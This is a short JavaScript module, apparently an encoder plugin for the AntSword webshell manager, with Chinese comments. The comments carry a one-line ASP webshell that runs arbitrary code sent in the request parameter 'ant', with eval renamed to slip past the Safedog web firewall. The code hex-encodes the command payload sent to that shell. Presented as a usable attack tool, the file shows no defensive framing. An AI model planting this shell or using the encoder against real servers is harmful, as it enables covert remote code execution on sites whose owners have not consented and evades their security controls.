// 
// asp::xxxx 编码模块
// 
// :把eval替换成 xxxx 用于过狗
//
// 服务端：<%Function xxxx(str) eval str End Function%><%D = request("ant")%><%xxxx D%>
// 密码：ant
'use strict';

module.exports = (pwd, data) => {
  data[pwd] = new Buffer(data['_']).toString('hex');
  delete data['_'];
  return data;
}